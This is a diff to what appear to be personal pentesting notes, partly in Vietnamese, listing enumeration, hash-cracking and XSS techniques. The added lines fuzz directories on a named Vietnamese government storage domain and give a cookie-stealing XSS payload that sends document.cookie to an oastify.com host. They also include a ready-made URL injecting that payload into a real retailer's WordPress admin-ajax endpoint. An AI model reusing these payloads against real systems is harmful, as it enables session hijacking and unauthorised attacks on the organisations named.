@@ -27,6 +27,7 @@
 	- find / -type f -perm /4000 2>dev/null
 
 	- gobuster dir --url https://10-10-203-33.p.thmlabs.com/ -w /home/kali/Desktop/SecLists-master/Discovery/Web-Content/common.txt
+	- ffuf -u https://storage.dx.gov.vn/Data/C_0/2023/10/06/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
 	
 	- └─$ hashcat -O -a 0 -m 10 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2 /usr/share/wordlist/rockyou.txt
 				+) 10 | md5($pass.$salt)
@@ -84,8 +85,8 @@
 	- innerHTML: Chèn giá trị trực tiếp vào code web
 	- h2:contains(): có thể inject xss
 	- javascript:alert(1) -> xss link
-	- 	
-
+	- <script>location=`http://j1lsg0zqa7yaytvnkn9uz58ao1usij68.oastify.com/?c=${document.cookie}`</script>
+https://www.circlek.com.vn/wp-admin/admin-ajax.php?action=load_detail_product&data_post_id=135328&lang=en&pageid=1279%27%22()%26%25%3Czzz%3E%3CScRiPt%20%3Elocation=`http://dev645r7ctx337tzykrt1fksbjha52tr.oastify.com/?c=${document.cookie}`%3C/ScRiPt%3E
 =======================================
 
 [+] Authentication:
